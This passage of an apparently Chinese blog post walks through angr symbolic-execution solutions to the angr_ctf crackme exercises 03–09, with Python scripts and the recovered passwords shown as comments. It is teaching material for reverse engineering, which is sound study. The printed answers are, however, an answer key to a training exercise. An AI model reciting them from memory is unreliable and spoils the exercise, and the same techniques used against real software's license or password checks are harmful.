punctuation">(</span><span class="token string">'./03_angr_symbolic_registers'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048980</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg3'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> arg1initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> arg2initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> arg3simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token comment">#simgr = project.factory.simgr(initial_state)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0xb9ffd04e</span><span class="token comment">#0xccf63fe8</span><span class="token comment">#0x8fd4d959</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h3><p>栈符号化，不能直接使用regs，通过计算构造esp和ebp在合适的位置 stack_push 入栈</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./04_angr_symbolic_stack'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048697</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebpinitial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> <span class="token number">8</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#1704280884</span><span class="token comment">#2382341151</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h3><p>主要是用到<code>initial_state.memory.store(addr, arg)</code>，将指定位置的变量符号化</p><p><code>%8s</code> -&gt; 8 字符，一个字符 8 字节，所以长度是 64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./05_angr_symbolic_memory'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048601</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg3 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg3'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg4 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg4'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token number">0xA1BA1C0</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> arg3<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> arg4<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg3<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg4<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'NAXTHGNR'</span><span class="token comment">#b'JVSFTPWE'</span><span class="token comment">#b'LMGAUHWC'</span><span class="token comment">#b'XMDCPALU'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h3><p>动态内存符号化， malloc 创建的地址未知，直接随便设置一个地址作为堆地址即可，堆地址存储在 bss 段的一个地址中，所以给 bss 段的变量一个自定义地址，往自定义地址里写输入位向量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./06_angr_symbolic_dynamic_memory'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048699</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>addr1 <span class="token operator">=</span> <span class="token number">0xABCC8A4</span>addr2 <span class="token operator">=</span> <span class="token number">0xABCC8AC</span>heap_ptr1 <span class="token operator">=</span> <span class="token number">0x12340</span>heap_ptr2 <span class="token operator">=</span> <span class="token number">0x12350</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr1<span class="token punctuation">,</span> heap_ptr1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr2<span class="token punctuation">,</span> heap_ptr2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>heap_ptr1<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>heap_ptr2<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'UBDKLMBV'</span><span class="token comment">#b'UNOERNYS'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h3><p><code>%64s</code> 64字符，每个字符 8 字节，长度是 8 * 64</p><p>从文件中读字符串进行对比，需要将文件内容符号化进行仿真文件系统，并且插入这个文件</p><p>blank_state 的起始地址是从 open 开始</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./07_angr_symbolic_file'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x80488ED</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>passwd_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span><span class="token string">'OJKSQYDP.txt'</span><span class="token punctuation">,</span> content<span class="token operator">=</span>arg1<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'OJKSQYDP.txt'</span><span class="token punctuation">,</span> passwd_file<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'AZOMMMZM\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x04\x80\x08\x00\x00\x00\x00\x01\x00\x00\x00\x10\x01\x00\x00\x00\x04@\x01\x01\x01\x08\x80 \x00\x00\x10\x00\x00\x04\x01\x00\x00\x00\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h3><p>比较函数使用了循环造成路径爆炸，直接 explore 运行到比较函数，通过添加约束来模拟比较过程而不实际执行比较过程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./08_angr_constraints'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048625</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x804A050</span><span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x8048565</span><span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x804A050</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'AUPDNNPROEZRJWKB'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'LGCRCDGJHYUNGUJB'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h3><p>写 hook 函数，程序的 scanf 不复杂，直接从头开始，hook 函数中获取输入值与固定值进行比较，程序中比较函数的逻辑是比较成功就返回 1 失败返回 0 ，这里也是同理成功就用位向量 BVV 表示返回 1，hook 的起始是 call 比较函数的地址，长度是 call 指令与下一条指令的距离</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./09_angr_hooks'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@project<span class="token punctuation">.</span>hook</span><span class="token punctuation">(</span><span class="token number">0x80486B3</span><span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x804A054</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'XYMKBKUHNIQYNQXE'</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token 